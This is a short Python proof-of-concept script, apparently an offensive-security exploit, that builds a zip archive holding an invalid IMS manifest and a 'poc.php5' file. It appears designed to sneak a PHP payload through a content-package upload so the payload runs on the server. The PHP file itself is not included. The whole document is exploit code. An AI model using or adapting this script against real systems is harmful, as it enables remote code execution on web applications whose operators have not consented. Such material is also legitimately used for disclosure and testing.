#!/usr/bin/python

import zipfile
from io import BytesIO

def _build_zip():
    f = BytesIO()
    z = zipfile.ZipFile(f, 'w')
    z.writestr('poc2/poc.txt', 'offsec', zipfile.ZIP_DEFLATED)
    z.writestr('imsmanifest.xml', 'invalid xml!')
    z.write('poc.php5')
    z.close()
    zip = open('poc2.zip','wb')
    zip.write(f.getvalue())
    zip.close()

_build_zip()
